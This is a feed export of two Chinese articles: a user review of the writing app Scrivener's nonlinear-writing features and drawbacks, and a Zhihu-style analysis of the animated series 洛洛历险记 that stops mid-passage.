[{"title":"脑洞式小说创作利器，村上春树同款非线性写作工具：Scrivener","date":"2021-07-05 03:31:51","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>我对写东西的热情可以说是起源于小学。那个时候用的是攒钱买的漂亮本子，在任何可以摸鱼的课上抽空完善故事情节和人物设定。等到假期的时候，再把这些文字一字一句地敲进电脑，发表在小说网站上<s>，居然现在还能找到</s>。</p>\n<p>我学电脑打字时候接触的第一个文字编辑软件就是 MS Word，当我有了更多的时间玩电脑之后，MS Word 也就顺理成章地成为了我唯一的码字软件。在转用 macOS 之后，写作软件就变成了和 MS Word 地位等同的 Pages。</p>\n<p>但是，在写作过程中，常常有这样几个问题困扰我。</p>\n<p>首先，用 Word/Pages 写作的时候，最顺手的方式是从头一口气写到尾。而我是个思维比较跳脱的人，常常会有突然想写三章后的一个情节这样的想法，放在文档中的哪里好像都不合时宜。</p>\n<p>其次，对于长篇小说来讲，大纲、人物小传分散在不同的文件夹里，加上需要上网现查的资料，经常要开很多个窗口，使页面变得非常混乱，而且非常容易打断写作思路。</p>\n<p>还有就是，当我的拖延症越来越严重、而记性越来越差之后，许多精彩的脑洞只剩下一个写成了的开头留在文档里。我在设想之初就完善过的故事情节、世界观和人物设定都不知道被我放在哪里去了！想要从头开始写，实在是很难找回当初的记忆和手感。</p>\n<p>上中学的时候，留给我写作的时间并不多。因此这些问题虽然很让人苦恼，但对写作体验的影响并不是特别大。当我上了大学，有了更多的空闲时间和金钱之后，就想着，能不能找到一款软件来让写作变得更舒服？</p>\n<p>最初认识 Scrivener 是因为见到一个文科友邻在豆瓣分享「颠覆她论文写作体验的两个 App」，一个是用于文献管理的 Zotero，另一个就是 <a href=\"https://www.literatureandlatte.com/scrivener/overview\">Scrivener</a>。</p>\n<p>我当时吃下了安利，两个软件都下载下来试用了一番。Zotero 对那时还不需要看太多文献的我用处有限，而 Scrivener 的界面虽然好看，友邻也吹得天花乱坠，但是不能插入化学式和表格体验感极差这两件事还是劝退了我。</p>\n<p>当时我一门心思地想用它写论文，忽视了它作为小说写作工具的可能。那一段时间里，我为了追求新鲜感，换了许多个写作软件，比如 Google Drive、小黑屋、备忘录和 Bear，终于在我不知道下一个该换什么的时候，从账单里找到了 Scrivener 的购买凭证，开始了用它写小说的不归路。</p>\n<span class=\"ss-application\" app-id=\"12098\"> </span><h2>Scrivener 有什么独到之处？</h2>\n<p>大部分文档软件，都采用的是「线性写作逻辑」，即，最舒服的写作顺序就是从头至尾。然而这个逻辑读起来爽快，写作起来总不是那么顺手。</p>\n<p>在 Scrivener 中，<strong>「非线性写作逻辑」</strong>成为了一个可选项。我既可以像在 Word 里那样一气呵成地写完一篇文章，也可以把一篇小说拆成四百个不同的场景，分别写好之后再拼接在一起。而写这四百个场景的顺序则全是看我心情。</p>\n<p>比如，如果在文章中采用了 POV 写法<sup class=\"ss-footnote\" href=\"\" title=\"POV（Point of View），一种写作手法，即“视点人物写作手法”，使用不同人的视角讲述故事。百度百科，2021.\" footnote-id=\"1\">1</sup>，用了主角和配角两方的视角来看同一件事，就可以把这件事分成两个文档，先写配角的亲身经历，然后试着以主角这个旁观者的身份切入。在成文的时候，却可以顺着主角的视角讲述这个故事，在事件完结后插入一章配角 POV 作为补充。实际上配角的故事还要在主角前面完成。</p>\n<p>再比如，写作的时候因为缺少冲突或者一个过渡的方法，非常容易在一个地方卡住。这个时候就可以先去写接下来的情节，等到有了灵感再来补全缺失的部分。</p>\n<p>Scrivener 的右边栏，则是非常方便整理思路。它分成<strong>「提要」</strong>和<strong>「便笺」</strong>两个部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/225d48b7f6915919031ac760d58579bd.png\"></figure><p>我一般在<strong>「提要」</strong>里写这个场景的提纲。这个栏目里的东西，默认成为这个文件的「简介」，在其他模式下可以直观地看到，方便后期的调整。同时，给每一个场景（故事）写一份大纲，且即使在写作模式下也可以随时检查，一方面可以提醒我不要写跑题了，另一方面则是为坑文作准备——如果真的写到一半忘记了，对照着大纲，很快就能想起一开始的设置。</p>\n<p><strong>「便笺」</strong>对我来说则更多地用来放置写作过程中产生的各种奇妙想法。比如合适这个场景但暂时想不到该怎么用的短语、主角的名台词、可以作为伏笔的线索……而且这一个栏目的文字是可以自行设置格式的（「提要」就不可以），所以也可以通过加粗、放大等方式来提醒我自己，有哪些东西一定不能忘记写。</p>\n<p>Scrivener 中丰富的模式选择也让写作过程中不断调节场景的顺序变得简单许多。最简单的方法，毫无疑问，就是直接在左侧的<strong>「Binder / 活页夹」</strong>中拖动文件顺序、改变文件层级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/74c6016fb891b842bfb32c7b6cb1f645.gif\"></figure><p>这款软件内置了三个模式，方便作者审阅并调整不同的文件。它们分别是：组合式文本、公告板，和大纲模式。</p>\n<p>想要从头到尾审阅一遍，检查连贯性的话，就可以使用<strong>「组合式文本」</strong>模式。软件会自动把这个文档里包含的所有子文档整合到一起，方便从头读起，检查不同文件之间的顺序是否正确、切换是否流畅。切换至这个模式的快捷键为 ⌘+1。写作模式下，点击有子文件的文件或文件夹就可以自动切换到这个模式，顶栏的图标也会发生变化：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/ad4db8a0e25d97a5f5fc98d7786a5a91.png\"></figure><p>这个模式下，文件之间的分割会用灰色虚线展示，而子文件所在位置也会在左侧的文件列表（活页夹）中展示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/eeb4b0514c98d5ad5d683b9500407836.png\"></figure><p>在这个模式下进行的修改，都会一一在原文档中还原，因此不必做更多的修改。</p>\n<p>如果在审阅全文的过程中发现了前后不连贯的地方，就可以切换至<strong>「公告板」</strong>模式进行拖拽。它的快捷键是 ⌘+2，也可以选择点击顶部的这个图标直接进入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/5a51ac10e433b3af3df78d7d6eaac982.png\"></figure><p>选中之后，将会展示选中的文档/文件夹下的所有子文件的标题和提要。</p>\n<p>「公告板」下有不同的模式，进入后的「初始状态」如左一，按照在文件夹内的顺序排列，可以移动顺序。中间图的「自由模式」则可以让各个文档在其中随意叠放、调整顺序。最右的「标签模式」则可以调整每一章的标签，把文件拖到哪一条颜色代表的线上，就代表这一个文件的标签修改为了颜色对应的标签内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/dbdf396c8a89456f2af70e725c63f217.png\"><figcaption>左起：初始状态、自由模式、标签模式</figcaption></figure><p>在这个模式下，「提要」中的内容就显得尤为重要，这样作者才能知道要怎么移动不同的文件板块才能达到想要的地方。如果大纲写得太多，一块「公告板」内放不下，可以选择在设置中调节每一块看板的大小和间距，也可以用更简单的方法：在「提要」的第一行写一个「一句话简介」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/f6a8bb174acf7f0d9c685acfe3a49de9.png\"></figure><p> </p>\n<p>最后一个模式叫做<strong>「大纲模式」</strong>，也可以用来审阅文章内容并作调整，但我最喜欢的用处是在这个模式下检查文件夹下所有子文件的状态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/87f0e2ad223ee736a7fd9bc48c7df8a8.png\"><figcaption>快捷键：⌘+3</figcaption></figure><p>相比于「组合式文本」只能检查正文内容、「公告板」只能查看文件的标题和提要，在大纲模式下，可选项更多。除了点击红框内的图标切换是否展示「提要」外，右键点击上边栏还能显示修改日期、字数统计、目标、进度等等内容，作者就可以借此检查每一部分的现状，并且借用 Scrivener 的分屏模式，同时修改文章的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/61f4d1ff10f97a44cebd0cc7f26187fa.png\"></figure><p>借用 Scrivener 的这三种内置模式，修改文章的顺序就要容易很多。直接拖动一个个文件这样的简单操作，还可以开多窗口审阅这样的作弊操作，无疑比 Word 里反复检查、复制、粘贴、再检查这个过程要省事得多。</p>\n<h2>还有哪些功能？</h2>\n<h3>网络及本地备份</h3>\n<p>Scrivener 提供本地备份和基于 <a href=\"https://www.dropbox.com/home\">Dropbox</a> 的网络备份。自从使用它以来，我断断续续地用中英文写了至少十几万字（词），出现过因为同步时间差造成的冲突文件（两个版本都有），但还没有出现过因为备份不及时导致的档案丢失。</p>\n<p>在「设置 - General」里可以找到自动保存的相关设置。默认状态下，Scrivener 每两秒就会保存当前文件。同时，当你每次按下保存键的时候，Scrivener 就会在本地保存一个备份。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/672a96e0ff99e2c5bdcb0f992cd7b087.png\"></figure><p>将默认的备份文件位置换成 Dropbox 文件所在的位置，就可以将文档备份至云端，可以在登入了同一个 Dropbox 账户的设备下访问。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/1f9da68ae28f9103a3e812478a8fc663.png\"></figure><p>在上面的图片中还提到一个功能，叫做「文本快照」。</p>\n<p>每个快照就是对 Scrivener 中单个文档的存档，可以在设置中选择自动添加快照，也可以点击右边栏上的图标手动添加。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/baf24a3fc13def644ded5630d0c4ca10.png\"></figure><p>对不同的版本，还可以选择右键「在校对助手中查看更改」，Scrivener 就会自动分屏，并展示出两版文件的区别。只是由于对中文的支持还是不太完善，有些时候的追踪不太准确。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/2debb6f3e8681366be0bebfd833181df.png\"></figure><h3>梗库和文档库放在一起</h3>\n<p>在很多时候，我都能冒出非常多奇怪的想法。一个有趣的人物，一个可以展开写写的梗，一个宏大的新世界。</p>\n<p>这些想法有的时候因为没时间写而搁置了；有的时候因为只想了一个开头，故事接下来的发展好像无以为继；有的时候觉得文化政治方面还有不周全的地方需要完善……种种原因导致这个想法只成了个转瞬即逝的脑洞、半个大纲、一节开头。如果不抓住它们，以后再想要捡起来就很难了。</p>\n<blockquote><p>因此，我设立了一个<strong>「梗库」</strong>，专门来存放那些没有能被我好好利用的脑洞。</p></blockquote>\n<p>等到哪天闲来无事，或者几年后我再打开，就有了机会完善它们也说不定。</p>\n<p>它取代了最初模版中的「研究 / Research」文件夹。这个文件夹的特点就是可以很方便地插入一切文件：图片、视频、音乐、网页、PDF……不论是什么东西激发了我的灵感，都可以轻松地放进去。</p>\n<p>对于我这种用爱发电的作者来说，写什么东西都没有截止期限，即使过了也不会有什么严重后果。这样做的缺点就是常常写到一半没灵感，或者觉得设定有问题，就卡住了，再想要捡起来的时候常常会忘了最初的设定是什么。所以，我会尽可能地记录想法、存档备份，让未来续写变得更简单。</p>\n<p>在「梗库」中每一个文件的正文部分，我通常只会放引起我灵感的那句话 / 那张图 / 那段情节，侧栏的「提要」和「笔记」很少会用到。如果基于一个短句有了发展成一段情节的想法，就在其下新建一个子文档，把扩展过的部分写出来。「标题」写风格类别，「提要」写剧情大纲，「笔记」首先链接灵感的源文件，再之后如果遇到了喜欢的梗就可以写一点。等我有了动笔的念头，就把这些子文档扔进「在写」文件夹，根据新的想法不断调整大纲和细节，不断完善内容，直到写完丢进「完结」文件夹为止。</p>\n<p>有的时候，故事从情节相关的那三个文件夹里慢慢发展出来，为了偷懒，直接结合已经成型的世界观和人设也是可以的。我的方法就是把人设或世界观所在的文档拖进新子文件的「笔记」栏里，和链接原本情节的部分放在一起。如果是写系列文，这么做也非常方便——右键点击超链接，选中「在快速参考面板中打开链接」，Scrivener 就会自动分屏，右侧展示出需要参考的部分，或者单独打开一个窗口，非常方便在写作过程中回溯最初的灵感来源。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/22/e42c6c5005a984bea61ac269e6d88b60.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/22/631ce10b1cec3b5e77f6cda25f849a7b.png\" alt=\"\"></figure><h3>姓名生成器</h3>\n<p>在「编辑 - 写作工具」中选择「姓名生成器」，就会出现如下界面：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/512b33c117bc2b180e59a6f7f32ebb3a.png\"></figure><p>对于主角种族的选项非常丰富，涵盖了大部分欧洲国家、日本和南亚的特色名字，在选择的时候也可以单独选择不同语言的姓氏和姓名，并且有男女之分。对于欧洲背景的小说，常常遇到「起的名字不符合出身」这样的问题，Scrivener 这个功能则是做到了一定程度上的补足。但缺点也非常明显：只会生成英文名，而且不能生成中文名字。</p>\n<h2>不足之处</h2>\n<p>Scrivener 最致命的缺点就是<strong>售价太高</strong>。电脑版售价 £47，即便用了学生折扣也要 £39.95，而 iOS 版还要额外付出 £19.99。换算成人民币是个挺恐怖的数字了，而 Pages 和 WPS 都不需要花钱。</p>\n<p>其次就是<strong>对中文的支持很差</strong>。虽然软件更新了中文版，但在姓名生成器上无法生成中文名，字数统计的时候需要看「字符数」而不能直接看底端显示的「字数」，语义分析工具也只支持英文。</p>\n<p>另外，虽然提供了云端同步，但是<strong>同步的过程有点麻烦</strong>。需要等文档上传云端才传输成功不说，如果在两台设备上同时打开同一个文件，就会产生冲突，因此在遇到这种情况的时候，Scrivener 会建议建立一个备份。备来备去，何时是尽头呢？一个不小心还有出现冲突文件的可能，尽管根据我的经历并不会有文件因此丢失，但是对比两个版本然后选择自己想要的那个的过程还是十分耗时的。如果追求极致的同步体验，macOS/iOS 的备忘录是我至今体验下来最流畅的。</p>\n<p>相比于国内制作的，专为网文设计的码字软件（如<a href=\"http://www.mochiwang.com/\">小黑屋</a>、<a href=\"http://mz.chenggua.com/\">橙瓜码字</a>、<a href=\"http://shen.dnbcw.info/\">大神码字</a>），Scrivener 仍有一些功能上的缺失。中文的姓名、门派生成器自不必说，由于国内作者圈的社交属性，国内的许多软件还内置了拼字和社交功能。在对日更数字非常敏感的网文圈，锁定（强制码字）、统计功能（今日总字数、时速、趋势图）就显得尤为必要了。另外，这些软件大多数还提供敏感词检测功能，是 Scrivener 短期内应该不会有的一个功能。</p>\n<h2>结语</h2>\n<p>对于我这样的咸鱼又喜欢开脑洞的短篇写手来说，一个 Scrivener 就可以满足我的所有需求：记梗、扩展梗；按照喜欢的顺序写文；完成后非常方便地审阅、调整，最后发布。尽管同步问题可能有些烦人，但是我大部分时候并不会在其他设备上写作，所以造成的影响微乎其微。</p>\n<p>如果你的需求和写作习惯与我相近，不如试一试 Scrivener！<a href=\"https://www.literatureandlatte.com/scrivener/download\">官网提供三十天的免费试用</a>（以使用时间计算，而不是下载时间），可以在尝试过后选择是否购买。</p>\n<p>题图：Unsplash <a href=\"https://unsplash.com/@rafaelabiazi\">@rafaelabiazi</a></p>\n<h3>本文中文字的出处：</h3>\n<ul>\n<li>「完结」下的文件名分别来自：TM Network<a href=\"https://www.ptt.cc/bbs/GUNDAM/M.1263761510.A.9FC.html\">《Beyond the Time》歌词</a>、盗墓笔记同人曲《<a href=\"https://www.bilibili.com/s/video/BV1Xa4y1t7Hk\">终章</a>》、Anatolia Amoretti《<a href=\"https://music.apple.com/cn/album/first-blush-of-spring/1392728742?i=1392733283\">First Blush of Spring</a>》、<a href=\"https://www.zhihu.com/question/372928729/answer/1025403762\">成语</a>、1999年电影<a href=\"https://music.douban.com/subject/1395045/\">《Himalaya》原声带</a>。</li>\n<li>所有出现的大段文字：<a href=\"https://suulnnka.github.io/BullshitGenerator/index.html\">狗屁不通文章生成器</a>。</li>\n<li>「刺穿身体的风」：出自<a href=\"https://xn--pxtr7m5ny.com/homework/29\">废文网溪流组第十九次作业主题</a>。梗的情节展开是自己想的，不要吐槽这个了，我知道很扯淡（。</li>\n<li>「L*fter @lakdhas」：是胡乱打的名字。</li>\n</ul>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/64515\" target=\"_blank\">让语音写稿成为现实：我的口述写作流分享</a></li>\n<li><a href=\"https://sspai.com/post/66883\" target=\"_blank\">不走寻常路的写作工具：我的 VS Code 配置经验分享</a></li>\n<li><a href=\"https://sspai.com/post/64842\" target=\"_blank\">从 Markdown 到 Pandoc，这是我的学术写作流程</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67363"},{"title":"如何评价洛洛历险记？","date":"2021-07-05 03:00:11","description":"\n<blockquote>其实，人生就是一场游戏，游戏就是一场人生。只不过这场游戏你想玩也得玩，不想玩也得玩。</blockquote>\n<p>《洛洛历险记》是蓝弧巅峰期的开始，亦是其巅峰期的结束。</p>\n<h3>背景</h3>\n<p>蓝弧动画的前身是蓝弧信息科技有限公司，创建日期为2003年，其法人为王巍，亦是导演多部蓝弧作品之人。</p>\n<p>03-07年，亦曾制作多过部动画，但是市场并无太大反响。</p>\n<p>而为他人打工而制作的《猪猪侠》则是却意外地火了。</p>\n<p>猪猪侠前四部，是猪猪侠其口碑最好之时，亦是蓝弧所制作。不过09年之后便不再参与制作，其导演以及编剧不再是王巍，现如今版权归属于广东咏声动漫股份有限公司。</p>\n<p>在此之后，猪猪侠剧情便越来越差，其IP价值也远不如以前。</p>\n<p>07-09年，蓝弧相继推出了《果冻宝贝》以及《果冻三剑客》，这两部动画可以说是《果宝特攻》的前传，但又不全是，因为很多概念都发生改变。这两部动画获得一定反响，或是星杰相中其实力，而前来与蓝弧合作。</p>\n<p>《洛洛历险记》里面的机车族，与变形金刚系列的汽车人有些相似，尤其是其变身方式。也是因此，有人称其为中国版的变形金刚。不过，也有人称《洛洛》抄袭《变形金刚》。</p>\n<p>不是，我在这里说一句。</p>\n<p>《洛洛历险记》与其相似是有缘故的，其IP来源有些许复杂，有点长。那就从其源头开始讲吧。</p>\n<p>美国有一个Tonka公司，在1982年生产了一个名为Go-Bots的机器人玩具，1983年改名为“百变雄师”，销量很高，买得比孩子宝还要好。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-46e709c1a73cb1268ea162d4a92bf0fa_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1468\" data-size=\"normal\" data-caption=\"看图便可知此物与变形金刚的差距\" data-watermark=\"original\" data-original-src=\"v2-46e709c1a73cb1268ea162d4a92bf0fa\" data-watermark-src=\"v2-4c170278910b67d2a97870da2157fcd4\" data-private-watermark-src=\"v2-60921c269f5968f511766e453ce74f79\"></p>\n<p>不过等到孩之宝创造了变形金刚系列之后，其形势便逆转了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c1847547d4908aed919a046939b20800_720w.jpg?rss\" data-rawwidth=\"420\" data-rawheight=\"597\" data-size=\"normal\" data-caption=\"差距一眼便得知\" data-watermark=\"original\" data-original-src=\"v2-c1847547d4908aed919a046939b20800\" data-watermark-src=\"v2-ba49232f509ab43e14aeb9df6bdf81cd\" data-private-watermark-src=\"v2-33d34ca63129dd5e93e47d67ece2b606\"></p>\n<p>此后，在1991年Tonka以及其《百变雄师》的版权被孩之宝收购。为了做出差异化处理，让其向子供向发展。</p>\n<p>待到榨干最后一滴价值时，便废置了它。</p>\n<p>而中国的星杰相中了它，便买下来并更名为“百变机兽”。</p>\n<blockquote>广州市星杰玩具有限公司成立于2003年，是一家集动漫产业的研发与生产，拍摄与制作，发行与销售，包装与配送于一体的综合性专业文化企业。<br>     一直以来，公司致力于右脑项目的开发，创作性思维为主的变形玩具的研制，先后推出十多个变形系列，上百余款变形产品，缔造了变形玩具销售奇迹，蜚声业界。<br>     公司拥有国内顶尖的创作、编剧、导演、摄像等核心制作团队，潜心原创动漫的创作。2008年斥巨资拍摄全球第一部注入中国武侠元素的52集全三维动画《百变机兽之洛洛历险记》，在全国省市电视台掀起了热播的狂潮，同名系列玩具“百变机兽”，瞬间风靡各地，并成为变形玩具的经典。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"\" data-url=\"http://starjet.b.ctoy.com.cn/\">[1]</sup>\n</blockquote>\n<p>上面是官网的介绍，不过就洛洛历险记的成片而言，并未展现其巨资，也许是蓝弧第一次做这种（战斗）作品，动作戏方面稍显拙劣。</p>\n<p>并且于2008年投资蓝弧，定好玩具的形象与名字，其它方面均由蓝弧负责。</p>\n<blockquote>于是星杰又找到蓝弧动画，由星杰提供玩具形象，蓝弧来改编动画，相当于动画是蓝弧原创的，只是人物名和造型是星杰早就定好的，这些造型来源就是原先孩之宝的百变雄师系列，然后经过改动而成的星杰百变机兽系列玩具。所以这里面的关系也就清晰了吧<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\" data-text=\"\" data-url=\"https://tieba.baidu.com/p/6176518550?red_tag=2325471446\">[2]</sup>\n</blockquote>\n<p>其动画名正是《百变机兽之洛洛历险记》。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-84d8aaf1fff0ffc8e3d32eea48a466aa_720w.jpg?rss\" data-rawwidth=\"752\" data-rawheight=\"560\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-84d8aaf1fff0ffc8e3d32eea48a466aa\" data-watermark-src=\"v2-f7a8d33f5424106779ad1c7408dbef02\" data-private-watermark-src=\"v2-3ffd9726067d66818a2b80b69d55bdda\"></p>\n<p>星杰要卖玩具，蓝弧需要钱做动画来展现自己的实力，二者一拍即合。</p>\n<p>就当时结果而言，这是一个双赢的局面。</p>\n<p>《洛洛历险记》大火，其玩具销量亦非常好。蓝弧也因这部动画名声大躁，也走向了巅峰期。</p>\n<p>不过，亦在此埋下一隐患，先按下不表。</p>\n<h3>原版</h3>\n<p>《洛洛历险记》是一部由蓝弧制作，集数为52集的3D动画。</p>\n<p>开头，洛洛在暴风雨天气下，仍在玩一个游戏。此游戏其名为《机战王》，此游戏为PvP游戏，里面有机车族与猛兽族方阵营。玩家必须选择一方阵营，然后与另一方阵营进行对战。</p>\n<p>洛洛在这游戏比赛中获得亚军。</p>\n<p>洛洛自然是机车族一方，此时正处于关键时刻，即使是其母亲让其不准打游戏，等她走后仍偷偷打开游戏机。之后便来到了经典桥段，异世界穿越。</p>\n<p>这个与《数码宝贝》的穿越方式类似，天上掉下几束光，便选中了几个主角。而《洛洛》这边自然也很朴素。仅仅只是一个雷电打下来，便穿越过去。</p>\n<p>之后，便开始了异世界之旅。</p>\n<p><b>情节优秀</b></p>\n<p>蓝弧在此处给洛洛安排的是标准的成长型主角剧本。即从零开始，自己与机车族一步步成长，最后与猛兽族能分庭抗礼。</p>\n<p>而此背景是一个机车族与猛兽族相互打仗的世界，机车族四分五裂，是一盘散沙。猛兽族虽然更甚，经常会互相暗算对方，但是有一点很重要，就是比机车族强，无论是其单兵实力，亦或者是其军队实力，都远比机车族强。</p>\n<p>不过机车族比猛兽族强的地方在于，机车族会有混合技，并且是刚刚好克制猛兽族一方的技能。</p>\n<p>并且，开挂相对而言并无多少，更多是智取，而非力敌。</p>\n<p>作为其面向对象（中小学生）而言，此剧本可称之为优秀，即便是成年后回头再看，同样可以顺畅地看下去，人物智商在线，并无太多降智与令人尴尬的情节。</p>\n<p>情节有转折，主线又异常清晰，地图亦更换得恰到好处，遇到之人亦随着人物实力增长而增长，始终处了一个水平当中。</p>\n<p>《洛洛》如若按照其地图划分，可分为时光之城篇、能源之城篇、风雪之城篇、最终决战篇。</p>\n<p>时光之城篇是洛洛进入游戏世界的第一个篇章，也是熟悉这个世界的第一个篇章，所以其对手并没有过强，只是狂野星手下的第一大将——金铁兽。不过为了给其相对应的实力，洛洛遇到的第一个机车族——霹雳火，亦是处于最弱状态，连其技能雷庭半月斩也使不出来。</p>\n<p>第一个篇章，是为了介绍其人物，以及世界观，更重要的是为下一篇章做辅垫。</p>\n<p>相对应的成长实力，洛洛遇到了历史最弱时期的霹雳火。霹雳火，据我所知，其名字出自于《水浒传》中秦明的外号。秦明以脾气暴躁而著称，而霹雳火则是典型的老好人。</p>\n<p>在第一次出场时，即使是敌人，也会劝其不必白白送死。</p>\n<p>于是便从零开始，一点点升级其实力，最后还是有惊无险地击退了金铁兽大军，并与力霸天、霹雳火以及风火轮一同前往能源之城。</p>\n<p>然后便开启了整部作品最优秀的篇章——能源之城篇章。</p>\n<p>这个篇章从第10集《见义勇为》到第35集《龙虎斗》，横跨25集，几乎所有人物悉数登场，能源之城，你方唱罢我方再登场。</p>\n<p>首先，开篇即进入高潮，猛虎王与狂野猩皆想夺取能源之城的能源紫水晶。二者为了争取攻打权，在能源之城外选择一处地方开战。</p>\n<p>猛虎王速度很快，但是很难破狂野猩的防，而狂野猩攻击力强，而速度则慢上许多，无法进猛虎王其身。</p>\n<p>二者各有强项，自身弱点皆是对方强项。这本应该是一场无法分出胜负的一场战斗，不过猛虎王选择用计谋，选用围殴战术，将狂野猩围殴致残。</p>\n<p>关键时刻金铁兽赶到，不过仍不是猛虎王对手，而关键时刻，机车族这边龙卷风、霹雳火和力霸王选择出手相救。这是一个弱肉强食的世界，即强者才能生存。可是除了弱肉强食，还有一群坚守原则的（机器）人。龙卷风讨厌人多欺少，猛虎王则一直喜欢以多欺少，二者正是水火不容的关系。而其霹雳火与力霸天则是极为看重义气，光明磊落之人自是见不惯诡计多端之人。</p>\n<p>人与人的感情，亦会影响其结果，后来洛洛的对手晶晶亦是如此。晶晶使用计谋将三个猛兽王移位，虽然狂野猩和猛虎王都将其对手逼入绝境。不过晶晶却忘了，就算棋子，也是会有个人情感的，棋子不应该不是毫无情感的，也要考虑棋子本身的情感方可成事。</p>\n<p>于是三者皆以不同原因而出手相救，最后都掉到熔浆下。不得不说，这个熔浆的设计是真的不错，熔浆则只是幻象，实则只是障眼法。所有的人都会惧怕掉入熔浆，而能源紫水晶刚好在其熔浆下面。</p>\n<p>最后，猛虎王以金铁兽为人质，换来狂野猩的退走，自此，能源之城的攻防战开始。</p>\n<p>能源之城的人物众多，自本身也是一个易守难攻的城池。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7adcabb92eaaca2599fbc288f8f18169_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"并且能源之城有空军优势\" data-watermark=\"original\" data-original-src=\"v2-7adcabb92eaaca2599fbc288f8f18169\" data-watermark-src=\"v2-25d257efe9031d9ced4bd9baba215d84\" data-private-watermark-src=\"v2-def0fa32c374556b35aa6bc45115c6d4\"></p>\n<p>正面强攻自然不行，于是猛虎王选择诱敌出来，通过歼灭其有生力量。再夺取城池。</p>\n<p>因为城主很谨慎，主动出击会导致一波被翻盘，所以即使是多次失败也不会导致人员损失惨重。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3d3d3b6a48d97c626a0aba34551a6cce_720w.jpg?rss\" data-rawwidth=\"822\" data-rawheight=\"621\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3d3d3b6a48d97c626a0aba34551a6cce\" data-watermark-src=\"v2-24868463521e1c791e687c9a2633572b\" data-private-watermark-src=\"v2-2213119af61c3cbe2effe5e917d9715d\"></p>\n<p>猛虎王的强大，这是众所周知的事实，而为了让机车族拥有打败其能力的信心，猛虎王通过一次次攻城挑战来麻痹众人，一次次地败退，让他们产生可以战胜猛虎王的想法，助长其骄兵气息。最后能源之城选择出击，却以惨败回归。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91122350f0efcb3576013f0012d0f22f_720w.jpg?rss\" data-rawwidth=\"823\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-91122350f0efcb3576013f0012d0f22f\" data-watermark-src=\"v2-7f3d75f51665cf55ef750929ccd9cd55\" data-private-watermark-src=\"v2-97fe686ab9b3e72f6b6d9a592a0d8c04\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ed0b9457227bda2e6f2a764698f867ef_720w.jpg?rss\" data-rawwidth=\"824\" data-rawheight=\"608\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ed0b9457227bda2e6f2a764698f867ef\" data-watermark-src=\"v2-2f9d79a931e6af12aa6239259f0a0760\" 